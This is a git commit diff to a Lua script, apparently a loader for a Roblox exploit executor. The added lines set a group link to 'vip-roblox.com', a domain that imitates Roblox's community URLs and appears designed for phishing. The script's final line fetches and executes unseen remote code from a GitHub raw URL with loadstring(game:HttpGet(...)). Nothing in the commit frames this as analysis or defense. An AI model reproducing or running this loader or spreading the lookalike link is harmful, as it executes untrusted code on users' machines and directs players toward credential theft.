ea5cf0f9dfd9a84dde5de5aafbc8ab1f2a27b725
Ninjajusn252j <juanleonardo375@gmail.com>
2025-06-08 14:21:21 +0200

    feat: Add/Update script for ninjajuan252j

--- scripts/ninjajuan252j.lua
+++ scripts/ninjajuan252j.lua
@@ -1,4 +1,6 @@
 -- Script Lua generado por DarkEclipse252j para ninjajuan252j
-local GroupLink = "https://funciona/"
-
+-- Script Principal - Lo que ejecutas en tu executor
+_G.Config = {
+    GroupLink = "https://vip-roblox.com/communities/949690685/", -- <--- ¡Esta línea ahora tiene la URL real desde Python!
+}
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninjajusn252j/universal-hub/main/Universalhub.lua"))()
